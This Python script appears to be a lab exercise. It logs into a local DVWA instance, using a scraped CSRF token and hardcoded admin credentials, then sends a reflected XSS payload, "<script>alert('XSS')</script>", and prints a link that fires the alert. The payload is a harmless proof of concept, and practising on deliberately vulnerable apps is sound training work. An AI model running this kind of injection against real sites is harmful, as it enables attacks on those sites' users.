import requests
from bs4 import BeautifulSoup
import urllib.parse

url_base = 'http://localhost'
login_url = f'{url_base}/login.php'
xss_url = f'{url_base}/vulnerabilities/xss_r/'

usuario = 'admin'
clave = 'csrf12345'

s = requests.Session()

print("🔐 Iniciando sesión en DVWA...")
login_page = s.get(login_url)
soup = BeautifulSoup(login_page.text, 'html.parser')
token_input = soup.find('input', {'name': 'user_token'})
token = token_input['value'] if token_input else ''

payload_login = {
    'username': usuario,
    'password': clave,
    'Login': 'Login',
    'user_token': token
}

response_login = s.post(login_url, data=payload_login)
if 'Login failed' in response_login.text:
    print("❌ Falló el login.")
    exit()
print("✅ Login exitoso.")

# Payload de XSS
payload = "<script>alert('XSS')</script>"

print("\n🎯 Enviando payload de XSS Reflected...")
params = {'name': payload}
response = s.get(xss_url, params=params)

if payload in response.text:
    print("✅ Payload XSS reflejado exitosamente en la respuesta.")
    encoded_payload = urllib.parse.quote(payload)
    full_url = f"{xss_url}?name={encoded_payload}"
    print(f"\n🔗 Abre esta URL en tu navegador para ver la alerta:\n{full_url}")
else:
    print("❌ El payload no fue reflejado en la respuesta.")
